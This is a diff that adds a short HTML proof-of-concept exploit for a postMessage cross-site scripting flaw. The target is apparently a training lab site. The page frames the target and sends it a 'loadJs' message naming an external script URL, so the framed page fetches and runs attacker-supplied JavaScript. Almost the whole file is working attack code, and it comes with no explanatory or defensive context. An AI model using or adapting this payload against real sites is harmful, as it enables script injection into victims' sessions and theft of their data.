@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>postMessage Exploit PoC</title>
+</head>
+<body>
+    <h3>Loading exploit...</h3>
+
+
+    <iframe id="frm" src="https://mjxwn1qwwx.voorivex-lab.online/"></iframe>
+
+    <script>
+        document.getElementById('frm').onload=function(){
+            const iframe=document.getElementById('frm').contentWindow;
+            iframe.postMessage({"type":"loadJs","jsUrl":"https://h4di0x.github.io/xss/postmessage_2_script.js"},'*');  //Sends message to the iframe
+        }
+    </script>
+</body>
+</html>
